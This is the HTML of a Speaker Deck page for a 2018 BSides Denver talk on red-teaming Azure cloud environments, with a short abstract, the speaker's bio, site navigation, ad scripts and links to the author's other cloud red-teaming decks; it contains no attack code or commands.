@@ -1,0 +1,2835 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title>Blue Cloud of Death: Red Teaming Azure - Speaker Deck</title>
+    <link rel="stylesheet" media="screen" href="https://d1eu30co0ohy4w.cloudfront.net/assets/application-cba30e7a2c4a3775839f3ae72af66c60a4f4c3dbf3ed63d2823cc1aeff683af8.css" />
+<script src="https://d1eu30co0ohy4w.cloudfront.net/assets/application-2ef0300d6a5359a4b84c.js"></script>
+
+<link rel="icon" type="image/png" href="https://d1eu30co0ohy4w.cloudfront.net/assets/favicon-c0fe5475f88a65b817c8cc7c0fedc01b7acc17fe27628fa13ca3f96e56e16977.png" />
+<link rel="apple-touch-icon" type="image/png" href="https://d1eu30co0ohy4w.cloudfront.net/assets/favicon-c0fe5475f88a65b817c8cc7c0fedc01b7acc17fe27628fa13ca3f96e56e16977.png" />
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no, viewport-fit=cover">
+<meta name="csrf-param" content="authenticity_token" />
+<meta name="csrf-token" content="rSsscpQEwIN/I/j+pN+Ys22w2uBcpIuMvXU6c443hOoRuG3YoplMa6NEd6Gor1qUxlPk0QcOHfByHOUB/LMXgw==" />
+
+
+      <link rel="alternate" type="application/json+oembed" href="https://speakerdeck.com/oembed.json?url=https%3A%2F%2Fspeakerdeck.com%2Ftweekfawkes%2Fblue-cloud-of-death-red-teaming-azure-1" title="Blue Cloud of Death: Red Teaming Azure" />
+
+  <meta property="og:url" content="https://speakerdeck.com/tweekfawkes/blue-cloud-of-death-red-teaming-azure-1" />
+  <meta property="og:site_name" content="Speaker Deck" />
+  <meta property="og:title" content="Blue Cloud of Death: Red Teaming Azure" />
+  <meta property="og:description" content="BSides Denver Presentation on May 11 2018
+
+On-demand IT services are being publicized as the “new normal”, but often times these services are misunderstood and hence misconfigured by engineers which can frequently enable red teams to gain, expand, and persist access within Azure environments.
+
+In this talk we will dive into how Azure services are commonly breached (e.g. discovering insecure blob storage), and then show how attackers are pivoting between the data &amp; control planes (e.g. mounting hard disks, swapping keys, etc...) to expand access. Finally we will demonstrate some unique techniques for persisting access within Azure environments for prolonged periods of time.
+
+Bryce Kunz (@TweekFawkes) is an Information Security Researcher located in Salt Lake City, Utah. Bryce currently leads the security offensive testing of Adobe&#39;s Marketing Cloud SaaS infrastructure via researching and developing custom exploits for web applications and other cloud based technologies. As a security professional, Bryce has spent time at various agencies (i.e. NSA, DoD, DHS, CBP) focusing on vulnerability research, penetration testing, and incident response. Bryce received an MBA from a NSA designated &quot;Center of Excellence&quot; Idaho State University (ISU) program with an emphasis in Information Assurance (IA) on a full academic scholarship from the National Science Foundation (NSF). Bryce holds numerous certifications (e.g. OSCP, CISSP, ...) and has spoken at various security conferences (i.e. DerbyCon, etc...). " />
+  <meta property="og:type" content="website" />
+  <meta property="og:author" content="https://www.facebook.com/SpeakerDeck" />
+  <meta property="og:image" content="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_0.jpg?10006930" />
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:site" content="@speakerdeck">
+  <meta name="twitter:creator" content="@speakerdeck">
+  <meta name="twitter:title" content="Blue Cloud of Death: Red Teaming Azure">
+  <meta name="twitter:description" content="BSides Denver Presentation on May 11 2018
+
+On-demand IT services are being publicized as the “new normal”, but often times these services are misunderstood and hence misconfigured by engineers which can frequently enable red teams to gain, expand, and persist access within Azure environments.
+
+In this talk we will dive into how Azure services are commonly breached (e.g. discovering insecure blob storage), and then show how attackers are pivoting between the data &amp; control planes (e.g. mounting hard disks, swapping keys, etc...) to expand access. Finally we will demonstrate some unique techniques for persisting access within Azure environments for prolonged periods of time.
+
+Bryce Kunz (@TweekFawkes) is an Information Security Researcher located in Salt Lake City, Utah. Bryce currently leads the security offensive testing of Adobe&#39;s Marketing Cloud SaaS infrastructure via researching and developing custom exploits for web applications and other cloud based technologies. As a security professional, Bryce has spent time at various agencies (i.e. NSA, DoD, DHS, CBP) focusing on vulnerability research, penetration testing, and incident response. Bryce received an MBA from a NSA designated &quot;Center of Excellence&quot; Idaho State University (ISU) program with an emphasis in Information Assurance (IA) on a full academic scholarship from the National Science Foundation (NSF). Bryce holds numerous certifications (e.g. OSCP, CISSP, ...) and has spoken at various security conferences (i.e. DerbyCon, etc...). ">
+  <meta name="twitter:image:src" content="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_0.jpg?10006930">
+  <link rel="canonical" href="https://speakerdeck.com/tweekfawkes/blue-cloud-of-death-red-teaming-azure-1" />
+
+  <meta name="stats-owner_id" content="403732" />
+  <meta name="stats-talk_id" content="443375" />
+  <meta name="stats-view_type" content="talk" />
+
+    
+  </head>
+  <body class="sd-app">
+    
+      <div class="alert alert-banner">
+            <a class="d-block text-center text-white" href="/pro">
+      <span class="text-warning">Upgrade to Pro</span> &mdash; share decks privately, control downloads, hide ads and more &hellip;
+</a>
+      </div>
+    <div class="sd-menu d-md-none">
+  <div class="container sd-menu-fixed-container">
+    <div class="sd-brand">
+      <a class="sd-brand-logo" href="/">
+        <img alt="Speaker Deck" src="https://d1eu30co0ohy4w.cloudfront.net/assets/mark-f4be6df1e05965cac9f98e664a6c35f5ffdd0207385d07464a9214d6cdf76082.svg" /> <span class="d-none d-md-inline">Speaker Deck</span>
+</a>    </div>
+
+      <nav class="sd-fixed-nav">
+        <div class="sd-nav-main js-toggle-container">
+          <ul class="sd-nav-fixed-group nav toggle-flex-when-off">
+            <li class="sd-nav-item d-md-block d-none">
+              <form action="https://www.google.com/cse" id="cse-search-box" class="form-inline ml-5 ml-md-3">
+                <input type="hidden" name="cx" value="010150859881542981030:hqhxyxpwtc4">
+                <input type="hidden" name="ie" value="UTF-8">
+                <input type="text" name="q" id="q" value="" placeholder="Search..." class="form-control search-input mr-2">
+                <input type="submit" name="sa" value="Search" class="btn btn-outline-primary d-inline-block d-md-none d-lg-inline-block">
+              </form>
+            </li>
+            <li class="sd-nav-item nav-item">
+                <a class="sd-nav-link nav-link" href="/pro">
+                  Speaker Deck <div class="badge badge-pro-prominent">PRO</div>
+</a>            </li>
+            <li class="sd-nav-item nav-item">
+              <a class="sd-nav-link nav-link" href="/signin">
+                Sign in
+</a>            </li>
+            <li class="sd-nav-item nav-item">
+              <a class="btn btn-primary" href="/signup">
+                Sign up <span class="d-none d-md-inline">for free</span>
+</a>            </li>
+            <li class="sd-nav-item d-block d-md-none">
+              <button class="btn btn-link mr-2 js-toggle-trigger">
+                <svg class="icon icon-search "><use xlink:href="/icons/icons.svg#icon-search"></use></svg>
+              </button>
+            </li>
+          </ul>
+          <ul class="sd-nav-fixed-group nav toggle-flex-when-on">
+            <li class="sd-nav-item">
+              <form action="https://www.google.com/cse" id="cse-search-box" class="form-inline ml-5 ml-md-3">
+                <input type="hidden" name="cx" value="010150859881542981030:hqhxyxpwtc4">
+                <input type="hidden" name="ie" value="UTF-8">
+                <div class="row">
+                  <div class="col col-auto pr-0">
+                    <input type="text" name="q" id="q" value="" placeholder="Search..." class="form-control search-input mr-2">
+                  </div>
+                  <div class="col col-auto">
+                    <input type="submit" name="sa" value="Search" class="btn btn-outline-primary d-inline-block d-md-none d-lg-inline-block">
+                  </div>
+                </div>
+              </form>
+            </li>
+            <li class="sd-nav-item pr-2">
+              <button class="btn btn-link js-toggle-trigger">
+                <svg class="icon icon-x "><use xlink:href="/icons/icons.svg#icon-x"></use></svg>
+              </button>
+            </li>
+          </ul>
+        </div>
+      </nav>
+  </div>
+</div>
+
+    
+    
+    <div class="sd-main">
+      
+
+
+
+<div class="deck deck-with-banner">
+  <div class="deck-background" style="background-image: url('https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/preview_slide_0.jpg?10006930')"></div>
+  
+  <div class="deck-header d-none d-md-block js-toggle-container">
+    <div class="container d-flex align-items-center w-100">
+      <div class="deck-header-logo py-3 flex-grow-0">
+        <a class="sd-brand-logo" href="/">
+          <img alt="Speaker Deck" src="https://d1eu30co0ohy4w.cloudfront.net/assets/mark-white-8d908558fe78e8efc8118c6fe9b9b1a9846b182c503bdc6902f97df4ddc9f3af.svg" />
+</a>      </div>
+      <h4 class="deck-header-title flex-grow-1 flex-shrink-0 w-100 d-none mx-3 d-md-block p-3 text-center m-0 text-white text-truncate toggle-block-when-off">
+
+
+
+
+        Blue Cloud of Death: Red Teaming Azure
+      </h4>
+      <div class="deck-header-user-nav toggle-block-when-on ml-auto">
+        <form action="https://www.google.com/cse" id="cse-search-box" class="form-inline ml-5 ml-md-3">
+          <input type="hidden" name="cx" value="010150859881542981030:hqhxyxpwtc4">
+          <input type="hidden" name="ie" value="UTF-8">
+          <input type="text" name="q" id="q" value="" placeholder="Search..." class="form-control form-control-inverse search-input mr-2">
+          <input type="submit" name="sa" value="Search" class="btn btn-success d-inline-block d-md-none d-lg-inline-block">
+        </form>
+      </div>
+      <div class="deck-header-user-nav toggle-block-when-on">
+        <button class="btn btn-link mr-2 js-toggle-trigger">
+          <svg class="icon icon-x "><use xlink:href="/icons/icons.svg#icon-x"></use></svg>
+        </button>
+      </div>
+      <div class="deck-header-user-nav toggle-block-when-off">
+        <button class="btn btn-link mr-2 js-toggle-trigger">
+          <svg class="icon icon-search "><use xlink:href="/icons/icons.svg#icon-search"></use></svg>
+        </button>
+      </div>
+      <div class="deck-header-user-nav flex-grow-0 dropdown py-3">
+        
+      </div>
+    </div>
+  </div>
+
+  
+<div class="deck-embed js-deck-embed" data-ratio="1.77777777777778" data-state="processed">
+    <div class="speakerdeck-embed" data-title="false" data-skip-resize="true" data-id="c2f4f81429694727a2667199cc9fac14" data-ratio="1.77777777777778" data-host="speakerdeck.com"></div>
+</div>
+
+
+  <div class="deck-meta">
+    <div class="container">
+      <div class="row align-items-center justify-content-between">
+        <div class="col-md-auto col-12 py-3">
+          <div class="row align-items-center justify-content-between justify-content-md-start">
+            <a class="d-flex align-items-center font-weight-bold text-white col-auto" href="/tweekfawkes">
+              <span class="mr-2">
+                <img class="avatar" src="//secure.gravatar.com/avatar/18ad4afa3f7c77bd84c3300505468aa0?s=47" alt="18ad4afa3f7c77bd84c3300505468aa0?s=47" />
+              </span>
+              <span>
+                TweekFawkes
+                
+              </span>
+</a>            <div class="col-auto text-muted">
+              May 11, 2018
+            </div>
+            <div class="col-auto d-none d-md-block">
+              
+            </div>
+          </div>
+        </div>
+        <div class="col-md-auto col-12 py-md-3 pb-3">
+          <div class="row justify-content-between justify-content-md-start">
+              <div class="col-auto mr-auto mr-md-0">
+                <a class="text-white font-weight-bold" href="/c/technology">
+                  <svg class="icon icon-folder "><use xlink:href="/icons/icons.svg#icon-folder"></use></svg> Technology
+</a>              </div>
+            <div class="col-auto">
+              <div class="js-stargazer animated">
+      <a class="text-white font-weight-bold" title="Star this deck" href="/signin?return_to=%2Ftweekfawkes%2Fblue-cloud-of-death-red-teaming-azure-1">
+        <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 2
+</a></div>
+
+            </div>
+            <div class="col-auto text-white font-weight-bold">
+              <span title="7,380 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 7.4k</span>
+            </div>
+              <div class="col-auto text-white font-weight-bold">
+                <a title="Download PDF" href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/Blue_Cloud_of_Death-Red_Teaming_Azure-v44.pdf"><svg class="icon icon-download "><use xlink:href="/icons/icons.svg#icon-download"></use></svg></a>
+              </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<style media="screen">
+.native-js  {
+  position: relative;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
+}
+
+.native-js .native-banner {
+  display: flex;
+  padding: 20px 20px;
+  text-decoration: none;
+
+  flex-flow: row nowrap;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.native-js .native-banner .native-img {
+  margin-right: 20px;
+  max-height: 50px;
+  line-height: 0;
+}
+
+.native-js .native-banner .native-main {
+  display: flex;
+  max-width: 1024px;
+  margin: 0 auto;
+
+  flex-grow: 1;
+  flex-flow: row nowrap;
+  align-items: center;
+}
+
+.native-js .native-banner .native-details {
+  display: flex;
+  margin-right: 20px;
+
+  flex-flow: column nowrap;
+}
+
+.native-js .native-banner .native-company {
+  margin-bottom: 4px;
+  text-transform: uppercase;
+  letter-spacing: 2px;
+  font-size: 10px;
+  line-height: 1;
+}
+
+.native-js .native-banner .native-desc {
+  letter-spacing: 1px;
+  font-weight: 300;
+  line-height: 1.4;
+}
+
+.native-js .native-banner .native-cta {
+  padding: 10px 16px;
+  border-radius: 3px;
+  box-shadow: 0 6px 13px 0 hsla(0, 0%, 0%, .15);
+  text-transform: uppercase;
+  white-space: nowrap;
+  letter-spacing: 1px;
+  line-height: 1;
+  font-weight: 400;
+  font-size: 12px;
+  transition: all .3s ease-in-out;
+  transform: translateY(-1px);
+}
+
+.native-js .native-banner .native-cta:hover {
+  box-shadow: none;
+  transform: translateY(1px);
+}
+
+.native-js .native-source {
+  position: absolute;
+  right: 0;
+  bottom: 0;
+  padding: 5px;
+  border-top: 0;
+  border-top-left-radius: 3px;
+  background: repeating-linear-gradient(-45deg, transparent, transparent 5px, hsla(0, 0%, 0%, .025) 5px, hsla(0, 0%, 0%, .025) 10px) hsla(203, 11%, 95%, .4);
+  color: #111;
+  text-decoration: none;
+  text-transform: uppercase;
+  letter-spacing: .5px;
+  font-weight: 600;
+  font-size: 7px;
+}
+
+
+@media only screen and (min-width: 320px) and (max-width: 759px) {
+  .native-js .native-banner,
+  .native-js .native-banner .native-main {
+    flex-flow: column nowrap;
+  }
+
+  .native-js .native-banner .native-img,
+  .native-js .native-banner .native-details {
+    margin: 0;
+  }
+
+  .native-js .native-banner .native-img {
+    display: none;
+  }
+
+  .native-js .native-banner .native-company {
+    letter-spacing: 1px;
+  }
+
+  .native-js .native-banner .native-details {
+    text-align:  left;
+    font-size: 14px;
+  }
+
+  .native-js .native-banner .native-cta {
+    display: none;
+  }
+}
+</style>
+<script src="//m.servedby-buysellads.com/monetization.js" type="text/javascript"></script>
+<div class="native-js"></div>
+<script>
+(function(){
+  if(typeof _bsa !== 'undefined' && _bsa) {
+      _bsa.init('custom', 'CK7I4K3Y', 'placement:speakerdeckcom',
+        {
+          target: '.native-js',
+          template: `
+<a href="##link##" class="native-banner" style="background: linear-gradient(-30deg, ##backgroundColor##E5, ##backgroundColor##E5 45%, ##backgroundColor## 45%) #fff;">
+    <div class="native-main">
+      <img class="native-img" img src="##logo##">
+      <div class="native-details" style="color: ##textColor##">
+        <span class="native-company">Sponsored by ##company##</span>
+        <span class="native-desc">##description##</span>
+      </div>
+      <span class="native-cta" style="color: ##ctaTextColor##; background-color: ##ctaBackgroundColor##;">##callToAction##</span>
+    </div>
+  </a>
+`,
+        }
+      );
+    }
+})();
+</script>
+
+<div class="container container-lg py-md-5 py-3">
+  <h1 class="mb-4">Blue Cloud of Death: Red Teaming Azure</h1>
+    <div class="deck-description mb-4">
+      <p>BSides Denver Presentation on May 11 2018</p>
+
+<p>On-demand IT services are being publicized as the “new normal”, but often times these services are misunderstood and hence misconfigured by engineers which can frequently enable red teams to gain, expand, and persist access within Azure environments.</p>
+
+<p>In this talk we will dive into how Azure services are commonly breached (e.g. discovering insecure blob storage), and then show how attackers are pivoting between the data &amp; control planes (e.g. mounting hard disks, swapping keys, etc...) to expand access. Finally we will demonstrate some unique techniques for persisting access within Azure environments for prolonged periods of time.</p>
+
+<p>Bryce Kunz (@TweekFawkes) is an Information Security Researcher located in Salt Lake City, Utah. Bryce currently leads the security offensive testing of Adobe's Marketing Cloud SaaS infrastructure via researching and developing custom exploits for web applications and other cloud based technologies. As a security professional, Bryce has spent time at various agencies (i.e. NSA, DoD, DHS, CBP) focusing on vulnerability research, penetration testing, and incident response. Bryce received an MBA from a NSA designated "Center of Excellence" Idaho State University (ISU) program with an emphasis in Information Assurance (IA) on a full academic scholarship from the National Science Foundation (NSF). Bryce holds numerous certifications (e.g. OSCP, CISSP, ...) and has spoken at various security conferences (i.e. DerbyCon, etc...). </p>
+    </div>
+  <div class="row align-items-center mb-4">
+    <div class="col-md-auto col-12 mr-md-auto mb-4 mb-md-0">
+      <div class="row align-items-center">
+        <div class="col-auto">
+          <a href="/tweekfawkes"><img class="avatar avatar-large" src="//secure.gravatar.com/avatar/18ad4afa3f7c77bd84c3300505468aa0?s=128" alt="18ad4afa3f7c77bd84c3300505468aa0?s=128" /></a>
+        </div>
+        <div class="col-auto pl-0">
+          <h4 class="m-0">
+            <a class="text-dark" href="/tweekfawkes">TweekFawkes</a>
+            
+          </h4>
+          <div class="text-muted">
+              May 11, 2018
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="col-md-auto col-12">
+      <div class="btn-group btn-group-flex d-flex" role="group">
+        
+        <a href="https://twitter.com/intent/tweet?url=https://speakerdeck.com/tweekfawkes/blue-cloud-of-death-red-teaming-azure-1&text=Blue+Cloud+of+Death%3A+Red+Teaming+Azure" class="btn btn-outline-primary w-100">
+          <svg class="icon icon-twitter "><use xlink:href="/icons/icons.svg#icon-twitter"></use></svg> Tweet
+        </a>
+        <button class="facebook-share btn btn-outline-primary w-100">
+          <svg class="icon icon-facebook "><use xlink:href="/icons/icons.svg#icon-facebook"></use></svg> Share
+        </button>
+      </div>
+    </div>
+  </div>
+
+  
+        <div class="carbon-container">
+          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7D553I&placement=speakerdeckcom" id="_carbonads_js"></script>
+        </div>
+      
+</div>
+
+<div class="bg-lightest border-top">
+  <div class="container py-md-4 py-3">
+      <div class="row mb-4 align-items-center">
+        <div class="col-12 col-lg-9 mb-3 mb-lg-0">
+          <h2 class="m-0">More Decks by TweekFawkes</h2>
+        </div>
+        <div class="col-12 col-lg-3 text-lg-right">
+          <a class="btn btn-outline-primary" href="/tweekfawkes">
+            See All by TweekFawkes  <svg class="icon icon-chevron-right "><use xlink:href="/icons/icons.svg#icon-chevron-right"></use></svg>
+</a>        </div>
+      </div>
+      <div class="row">
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/tweekfawkes/serverless-and-dys-functional-cloud-red-teaming" title="Serverless and Dys-FUNctional Cloud Red Teaming">
+      <div class="card deck-preview" data-id="685af27f223943e59b73a853fa214d9b" data-slide-count="98" data-cover-image="https://files.speakerdeck.com/presentations/685af27f223943e59b73a853fa214d9b/preview_slide_0.jpg?16591072">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/685af27f223943e59b73a853fa214d9b/preview_slide_0.jpg?16591072');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/685af27f223943e59b73a853fa214d9b/preview_slide_0.jpg?16591072');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/18ad4afa3f7c77bd84c3300505468aa0?s=48" alt="18ad4afa3f7c77bd84c3300505468aa0?s=48" />
+              tweekfawkes
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 0
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="24 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 24</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/tweekfawkes/the-future" title="The Future?!">
+      <div class="card deck-preview" data-id="ee19192cd7ed42d1bb890faaacff601f" data-slide-count="30" data-cover-image="https://files.speakerdeck.com/presentations/ee19192cd7ed42d1bb890faaacff601f/preview_slide_0.jpg?15169652">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/ee19192cd7ed42d1bb890faaacff601f/preview_slide_0.jpg?15169652');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/ee19192cd7ed42d1bb890faaacff601f/preview_slide_0.jpg?15169652');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/18ad4afa3f7c77bd84c3300505468aa0?s=48" alt="18ad4afa3f7c77bd84c3300505468aa0?s=48" />
+              tweekfawkes
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 0
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="95 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 95</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/tweekfawkes/may-the-cloud-be-with-you-red-teaming-gcp-google-cloud-platform-be530661-d5c9-4a5a-9e40-613798564642" title="May the Cloud be with You: Red Teaming GCP (Google Cloud Platform)">
+      <div class="card deck-preview" data-id="b27747003e614837bd50abecd63b1076" data-slide-count="82" data-cover-image="https://files.speakerdeck.com/presentations/b27747003e614837bd50abecd63b1076/preview_slide_0.jpg?14180703">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/b27747003e614837bd50abecd63b1076/preview_slide_0.jpg?14180703');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/b27747003e614837bd50abecd63b1076/preview_slide_0.jpg?14180703');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/18ad4afa3f7c77bd84c3300505468aa0?s=48" alt="18ad4afa3f7c77bd84c3300505468aa0?s=48" />
+              tweekfawkes
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 0
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="462 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 460</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/tweekfawkes/may-the-cloud-be-with-you-red-teaming-gcp-google-cloud-platform" title="May the Cloud be with You: Red Teaming GCP (Google Cloud Platform)">
+      <div class="card deck-preview" data-id="8a700941610449679b508c70c5b55ac3" data-slide-count="116" data-cover-image="https://files.speakerdeck.com/presentations/8a700941610449679b508c70c5b55ac3/preview_slide_0.jpg?14017189">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/8a700941610449679b508c70c5b55ac3/preview_slide_0.jpg?14017189');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/8a700941610449679b508c70c5b55ac3/preview_slide_0.jpg?14017189');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/18ad4afa3f7c77bd84c3300505468aa0?s=48" alt="18ad4afa3f7c77bd84c3300505468aa0?s=48" />
+              tweekfawkes
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 0
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="33 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 33</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/tweekfawkes/uvu-red-teaming-gcp-google-cloud-platform" title="UVU - Red Teaming GCP (Google Cloud Platform)">
+      <div class="card deck-preview" data-id="e6433ce7395a48e6bdcdc9bdb7d4d374" data-slide-count="108" data-cover-image="https://files.speakerdeck.com/presentations/e6433ce7395a48e6bdcdc9bdb7d4d374/preview_slide_0.jpg?12704707">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/e6433ce7395a48e6bdcdc9bdb7d4d374/preview_slide_0.jpg?12704707');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/e6433ce7395a48e6bdcdc9bdb7d4d374/preview_slide_0.jpg?12704707');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/18ad4afa3f7c77bd84c3300505468aa0?s=48" alt="18ad4afa3f7c77bd84c3300505468aa0?s=48" />
+              tweekfawkes
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 0
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="76 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 76</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/tweekfawkes/you-did-what-in-my-bucket-red-teaming-gcp-google-cloud-platform" title="You Did What In My Bucket? Red Teaming GCP (Google Cloud Platform)">
+      <div class="card deck-preview" data-id="f994e92cc86b469c94aa44c7e911e1ed" data-slide-count="108" data-cover-image="https://files.speakerdeck.com/presentations/f994e92cc86b469c94aa44c7e911e1ed/preview_slide_0.jpg?12358169">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/f994e92cc86b469c94aa44c7e911e1ed/preview_slide_0.jpg?12358169');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/f994e92cc86b469c94aa44c7e911e1ed/preview_slide_0.jpg?12358169');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/18ad4afa3f7c77bd84c3300505468aa0?s=48" alt="18ad4afa3f7c77bd84c3300505468aa0?s=48" />
+              tweekfawkes
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 0
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="117 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 120</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/tweekfawkes/its-all-in-the-cloud-red-teaming-gcp-google-cloud-platform" title="It&#39;s All in the Cloud - Red Teaming GCP (Google Cloud Platform)">
+      <div class="card deck-preview" data-id="b085e859fddb4530a6dfd70a24702a87" data-slide-count="64" data-cover-image="https://files.speakerdeck.com/presentations/b085e859fddb4530a6dfd70a24702a87/preview_slide_0.jpg?11910373">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/b085e859fddb4530a6dfd70a24702a87/preview_slide_0.jpg?11910373');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/b085e859fddb4530a6dfd70a24702a87/preview_slide_0.jpg?11910373');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/18ad4afa3f7c77bd84c3300505468aa0?s=48" alt="18ad4afa3f7c77bd84c3300505468aa0?s=48" />
+              tweekfawkes
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 0
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="466 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 470</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
